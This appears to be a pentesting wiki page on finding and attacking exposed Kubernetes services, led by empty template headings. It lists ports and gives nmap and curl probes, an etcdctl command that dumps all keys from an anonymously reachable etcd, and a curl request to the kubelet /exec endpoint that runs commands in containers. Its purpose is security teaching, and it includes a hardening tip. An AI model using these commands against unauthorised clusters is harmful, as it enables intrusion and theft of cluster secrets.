---
hide:
  - tags
tags:
  - kubernetes
  - k8s
---

<!-- overview -->

# Overview

<!-- use a paragraph to set context for the entire topic.. -->

<!-- prerequisites -->

## Prerequisites

<!-- use bullet lists when possible. Add additional prerequisites below the ones included by default. -->

<!-- objectives -->

## objectives

<!-- use bullet lists. -->

<!-- lessoncontent -->

## lessoncontent

<!-- use a mix of numbered lists and narrative content as appropriate. -->

<!-- cleanup -->

## cleanup

<!-- use numbered lists to describe the steps to clean up the state of the cluster after finishing the task.-->

<!-- whatsnext -->

## Whatsnext

<!-- give a bullet list of up to 5 topics the reader might be interested in reading next.
 -->


# Pentesting Kubernetes Services

---

## Finding exposed pods with OSINT

- One way could be searching for `Identity LIKE "k8s.%.com"` in [crt.sh](https://crt.sh/) to find subdomains related to kubernetes.
- Another way might be to search `"k8s.%.com"`in github and search for **YAML files** containing the string.

---

## How Kubernetes Exposes Services

It might be useful for us to understand how Kubernetes can **expose services publicly** in order to find them:

[:fontawesome-solid-book: Exposing Services in Kubernetes](exposing-services-in-kubernetes.md){ .md-button }

---

## Finding Exposed pods via port scanning

The following ports might be open in Kubernetes cluster:

| Port        | Process        | Description                                                             | Protocol |
| ----------- | -------------- | ----------------------------------------------------------------------- | :------: |
| 2379        | etcd           |                                                                         |   TCP    |
| 6666        | etcd           | etcd                                                                    |   TCP    |
| 4194        | cAdvisor       | Container metrics                                                       |   TCP    |
| 443         | kube-apiserver | Kubernetes API port                                                     |   TCP    |
| 6443        | kube-apiserver | Kubernetes API port                                                     |   TCP    |
| 8443        | kube-apiserver | Minukube API port                                                       |   TCP    |
| 8080        | kube-apiserver | Insecure API port                                                       |   TCP    |
| 10250       | kubelet        | HTTPS API which allows full mode access                                 |   TCP    |
| 10255       | kubelet        | Unauthenticated read-only HTTP port: pods, running pods, and node state |   TCP    |
| 10256       | kube-proxy     | Kube Proxy health check server                                          |   TCP    |
| 9099        | calico-felix   | Health check server for Calico                                          |   TCP    |
| 6782-6784   | weave          | Metrics and endpoints                                                   |   TCP    |
| 30000-32767 | NodePort       | Proxy to the services                                                   |   TCP    |
| 44134       | Tiller         | Helm service listening                                                  |   TCP    |

### Nmap

=== "Example"

    ```{ .sh .annotate linenums="1"}
    nmap -n -T4 -p 443,2379,6666,4194,6443,8443,8080,10250,10255,10256,9099,6782-6784,30000-32767,44134 10.244.0.137/16
    ```

=== "Syntax"

    ```{ .sh .annotate linenums="1"}
    nmap -n -T4 -p 443,2379,6666,4194,6443,8443,8080,10250,10255,10256,9099,6782-6784,30000-32767,44134 <pod_ipaddress>/16
    ```

### Kube-apiserver

This is the **API Kubernetes service** the administrator talks with usually using the tool **`kubeclt`**.

**Common ports: 6443 and 443**, but also 8443 in minikube and 8080 as insecure.
=== "Syntax"

    ```{ .sh .annotate linenums="1"}
    curl -k https://<IP Address>:(8|6)443/swaggerapi
    curl -k https://<IP Address>:(8|6)443/healthz
    curl -k https://<IP Address>:(8|6)443/api/v1
    ```

=== "Example 443"

    ```{ .sh .annotate linenums="1"}
    curl -k https://127.0.0.1:443/swaggerapi
    curl -k https://127.0.0.1:443/healthz
    curl -k https://127.0.0.1:443/api/v1
    ```

=== "Example 6443"

    ```{ .sh .annotate linenums="1"}
    curl -k https://127.0.0.1:6443/swaggerapi
    curl -k https://127.0.0.1:6443/healthz
    curl -k https://127.0.0.1:6443/api/v1
    ```

=== "Example 8443"

    ```{ .sh .annotate linenums="1"}
    curl -k https://127.0.0.1:8443/swaggerapi
    curl -k https://127.0.0.1:8443/healthz
    curl -k https://127.0.0.1:8443/api/v1
    ```

=== "Example 8080"

    ```{ .sh .annotate linenums="1"}
    curl -k https://127.0.0.1:8080/swaggerapi
    curl -k https://127.0.0.1:8080/healthz
    curl -k https://127.0.0.1:8080/api/v1
    ```

**Check the following page to learn how to obtain sensitive data and perform sensitive actions talking to this service:**

[:fontawesome-solid-book: Kubernetes Enumeration](kubernetes-enumeration.md){ .md-button }

### Kubelet API

This service **run in every node of the cluster**. It's the service that will **control** the pods inside the **node**. It talks with the **kube-apiserver**.

If we find this service exposed we might have found and **[unauthenticated RCE](./#kubelet-rce)**

#### Kubelet API

=== "Example"

    ```{ .sh .annotate linenums="1"}
    curl -k https://127.0.0.1:10250/metrics
    curl -k https://127.0.0.1:10250/pods
    ```

=== "Syntax"

    ```{ .sh .annotate linenums="1"}
    curl -k https://<IP address>:10250/metrics
    curl -k https://<IP address>:10250/pods
    ```

If the response is `Unauthorized` then it requires authentication.

If we can list nodes we can get a list of kubelets endpoints with:

```{ .sh .annotate linenums="1"}
kubectl get nodes -o custom-columns='IP:.status.addresses[0].address,KUBELET_PORT:.status.daemonEndpoints.kubeletEndpoint.Port' | grep -v KUBELET_PORT | while IFS='' read -r node; do
    ip=$(echo $node | awk '{print $1}')
    port=$(echo $node | awk '{print $2}')
    echo "curl -k --max-time 30 https://$ip:$port/pods"
    echo "curl -k --max-time 30 https://$ip:2379/version" #Check  also for etcd
done
```

#### Kubeket (Read only)

=== "Example"

    ```{ .sh .annotate linenums="1"}
    curl -k https://127.0.0.1:10255
    http://111.0.0.1:10255/pods
    ```

=== "Syntax"

    ```{ .sh .annotate linenums="1"}
    curl -k https://<IP Address>:10255
    http://<external-IP>:10255/pods
    ```

### etcd API

=== "Example"

    ```{ .sh .annotate linenums="1"}
    curl -k https://127.0.0.1:2379
    curl -k https://127.0.0.1:2379/version
    etcdctl --endpoints=http://127.0.0.1:2379 get / --prefix --keys-only
    ```

=== "Syntax"

    ```{ .sh .annotate linenums="1"}
    curl -k https://<IP address>:2379
    curl -k https://<IP address>:2379/version
    etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
    ```

### Tiller

```{ .sh .annotate linenums="1"}
helm --host tiller-deploy.kube-system:44134 version
```

We could abuse this service to escalte privileges inside Kubernetes:

[:fontawesome-solid-book: 44134 - Pentesting Tiller (Helm)](../pentesting/network/44134-pentesting-tiller-helm.md){ .md-button }

### cAdvisor

=== "Example"

    ```{ .sh .annotate linenums="1"}
    curl -k https://127.0.0.1:4194
    ```

=== "Syntax"

    ```{ .sh .annotate linenums="1"}
    curl -k https://<IP Address>:4194
    ```

### NodePort

When a port is exposed in all the nodes via a **NodePort**, the same port is opened in all the nodes proxifying the traffic into the declared **Service**. By default this port will be in the range **30000 - 32767**. So new unchecked services might be accessible through those ports.
=== "Example"

    ```{ .sh .annotate linenums="1"}
    sudo nmap -sS -p 30000-32767 127.0.0.1
    ```

=== "Syntax"

    ```{ .sh .annotate linenums="1"}
    sudo nmap -sS -p 30000-32767 <IP>
    ```
```

---

## Vulnerable Misconfigurations

### Kube-apiserver Anonymous Access

By **default**, **kube-apiserver** API endpoints are **forbidden** to **anonymous** access. But it's always a good idea to check if there are any **insecure endpoints that expose sensitive information**

![Screenshot](img/kube-pen-fig-1.png)

### Checking for ETCD Anonymous Access

The ETCD stores the cluster secrets, configuration files and more **sensitive data**. By **default**, the ETCD **cannot** be accessed **anonymously**, but it always good to check.

If the ETCD can be accessed anonymously, you may need to **use the [etcdctl](https://github.com/etcd-io/etcd/blob/master/etcdctl/READMEv2.md) tool**. The following command will get all the keys stored:

=== "Example"

    ```{ .sh .annotate linenums="1"}
    etcdctl --endpoints=http://127.0.0.1:2379 get / --prefix --keys-only
    ```

=== "Syntax"

    ```{ .sh .annotate linenums="1"}
    etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
    ```


### Kubelet RCE

The **[Kubelet documentation](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/)** explains that by **default anonymous access** to the service is **allowed**:

```{ .sh .annotate linenums="1"}
--anonymous-auth     Default: true
```

> Enables anonymous requests to the Kubelet server. Requests that are not rejected by another authentication method are treated as anonymous requests. Anonymous requests have a username of system:anonymous, and a group name of system:unauthenticated. (DEPRECATED: This parameter should be set via the config file specified by the Kubelet's --config flag. See [kubelet-config-file](https://kubernetes.io/docs/tasks/administer-cluster/kubelet-config-file/) for more information.)

The **Kubelet** service **API is not documented**, but the source code can be found here and finding the exposed endpoints is as easy as **running**:
=== "Example"

    ```{ .sh .annotate linenums="1"}
    curl -s https://raw.githubusercontent.com/kubernetes/kubernetes/master/pkg/kubelet/server/server.go | grep 'Path("/'
    ```
=== "Syntax"

    ```{ .sh .annotate linenums="1"}
    curl -s https://raw.githubusercontent.com/kubernetes/kubernetes/master/pkg/kubelet/server/server.go | grep 'Path("/'
    ```

??? example "Expected output"

    ```{ .sh .annotate linenums="1"}
    Path("/pods").
    Path("/run")
    Path("/exec")
    Path("/attach")
    Path("/portForward")
    Path("/containerLogs")
    Path("/runningpods/").
    ```

All of them sounds interesting.

#### /pods

This endpoint list pods and their containers:
=== "Example"

    ```{ .sh .annotate linenums="1"}
    curl -ks https://worker:10250/pod
    ```
=== "Syntax"

    ```{ .sh .annotate linenums="1"}
    curl -ks https://worker:10250/pods
    ```

??? example "Expected output"

    ```{ .sh .annotate linenums="1"}
    ```
#### /exec

This endpoint allows to execute code inside any container very easily:
=== "Syntax"

    ```{ .sh .annotate linenums="1"}
    # Tthe command is passed as an array (split by spaces) and that is a GET request.
    curl -Gks https://worker:10250/exec/{namespace}/{pod}/{container} \
      -d 'input=1' -d 'output=1' -d 'tty=1' \
      -d 'command=ls' -d 'command=/'
    ```
=== "Example"

    ```{ .sh .annotate linenums="1"}
    # Tthe command is passed as an array (split by spaces) and that is a GET request.
    curl -Gks https://worker:10250/exec/{namespace}/{pod}/{container} \
      -d 'input=1' -d 'output=1' -d 'tty=1' \
      -d 'command=ls' -d 'command=/'
    ```

??? example "Expected output"

    ```{ .sh .annotate linenums="1"}
    ```

To automate the exploitation you can also use the script **[kubelet-anon-rce](https://github.com/serain/kubelet-anon-rce)**

!!! info
    To avoid this attack the kubelet service should be run with `--anonymous-auth false` and the service should be segregated at the network level.

### Checking Kubelet (Read Only Port) Information Exposure

